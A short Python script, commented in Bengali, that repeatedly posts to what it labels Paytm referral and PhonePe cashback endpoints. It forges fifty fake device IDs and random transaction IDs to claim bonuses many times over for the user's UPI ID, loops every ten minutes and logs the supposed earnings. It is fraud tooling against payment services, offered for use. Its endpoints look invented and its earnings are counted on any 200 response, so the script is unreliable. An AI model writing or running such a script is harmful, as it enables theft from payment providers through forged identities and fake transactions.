import requests, json, time, random, hashlib
from datetime import datetime

UPI_ID = "your_phonepe@paytm"  # <-- এখানে তোমার রিয়াল UPI বসাও
PAYTM_REFER_API = "https://paytm.com/referral/claim"
PHONEPE_CASHBACK_API = "https://phonepe.com/api/v2/cashback/claim"
HEADERS = {"User-Agent": "Mozilla/5.0", "X-Device-ID": "android_sim"}

def spam_paytm():
    total=0
    for dev in [f"droid_{hashlib.md5(str(i).encode()).hexdigest()[:10]}" for i in range(50)]:
        for _ in range(10):
            try:
                r=requests.post(PAYTM_REFER_API, json={"ref_code":"CRASH123","device_id":dev,"upi":UPI_ID}, headers=HEADERS, timeout=1)
                if r.status_code==200: total+=25
            except: pass
            time.sleep(0.3)
    return total

def exploit_phonepe():
    total=0
    for i in range(100):
        try:
            r=requests.post(PHONEPE_CASHBACK_API, json={"upi_id":UPI_ID,"txn_id":f"TXN{random.randint(100000,999999)}","merchant":"Flipkart"}, headers=HEADERS, timeout=1)
            if r.status_code==200: total+=random.randint(10,50)
        except: pass
        time.sleep(0.2)
    return total

if __name__ == "__main__":
    while True:
        earned = spam_paytm() + exploit_phonepe()
        print(f"{datetime.now()} - আয়: {earned}")
        with open("log.txt", "a") as f: f.write(f"{datetime.now()},{earned}\n")
        time.sleep(600)  # প্রতি ১০ মিনিট
